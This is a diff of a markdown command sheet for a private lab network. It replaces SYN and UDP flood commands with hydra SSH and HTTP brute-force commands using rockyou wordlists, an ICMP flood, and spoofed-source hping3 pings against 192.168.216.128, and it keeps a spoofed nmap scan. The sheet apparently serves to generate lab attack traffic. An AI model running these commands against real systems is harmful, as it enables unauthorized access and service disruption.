@@ -19,18 +19,27 @@ sudo nmap -S 192.168.216.101 -e eth0 -sV -sC -A -T5 -p 1-65535 192.168.216.128 -
 
 ---
 
-## 2️⃣ SYN Flood — hping3
+## 2️⃣ SSH Brute Force — hydra
 
 ```bash
-sudo hping3 -S -a 192.168.216.102 -I eth0 -p 80 --flood 192.168.216.128
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.216.128 -t 4 -V
+```
+```bash
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p 123456 ssh://192.168.216.128 -t 4 -V
+```
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://192.168.216.128/ -V
 ```
 
 ---
 
-## 3️⃣ UDP Flood — hping3
+## 3️⃣ ICMP Flood — ping
 
 ```bash
-sudo hping3 --udp -a 192.168.216.103 -I eth0 -p 53 --flood 192.168.216.128
+sudo ping -f -c 1000 -s 65500 192.168.216.128
+```
+```bash
+sudo hping3 -1 -a 192.168.216.103 -I eth0 -c 500 192.168.216.128
 ```
 
 ---
